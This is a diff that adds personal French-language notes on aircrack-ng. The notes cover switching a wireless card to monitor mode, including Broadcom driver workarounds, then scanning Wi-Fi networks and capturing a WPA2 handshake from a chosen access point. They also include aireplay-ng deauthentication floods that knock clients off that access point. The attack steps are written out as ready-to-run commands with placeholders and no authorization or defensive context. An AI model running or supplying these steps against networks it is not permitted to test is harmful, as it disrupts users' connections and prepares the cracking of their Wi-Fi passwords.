@@ -1,0 +1,59 @@
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+	Aircrack-ng
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+1. Installer ce paquet
+#apt-get install aircrack-ng
+
+2. Configurer l'interface en mode monitor
+#ip a
+#iw dev
+
+---1---
+#ip link set wlp3s0 down
+#iw wlp3s0 set monitor control
+#ip link set wlp3s0 up
+
+
+---2---
+#airmon-ng
+#airmon-ng check
+#airmon-ng check kill
+#airmon-ng start wlp3s0
+
+
+---3---
+#ifconfig wlp3s0 down
+#iwconfig wlp3s0 mode monitor
+#ifconfig wlp3s0 up
+
+---4---
+#apt-get install firmware-b43-installe
+#modprobe -r wl
+#modprobe b43
+#echo b43 >> /etc/modules
+#airmon-ng start wlp3s0
+#ifconfig wlp3s0b1 down
+#iwconfig wlp3s0b1 mode monitor
+#ifconfig wlp3s0b1 up
+#iw dev
+
+3.Capter tous les signaux wifi
+#airodump-ng mon0
+
+4.Capter le handshake pour un point d'accès
+#airodump-ng -c 1 --bssid <bssid> -w WPA2crack mon0 --ignore-negative-one
+#aireplay-ng --deauth 100 -a <bssid> mon0 --ignore-negative-one
+#aireplay-ng --deauth 100 -a <bssid> -c <@MAC> mon0 --ignore-negative-one
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+#systemctl stop NetworkManager
+#curl ipinfo.io/ip
+#lspci
+#lspci -vnn
+#modinfo bcma
+#modinfo wl
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+http://www.pexiweb.be/aircrack-monitor-avec-carte-broadcom-bcm43xx/
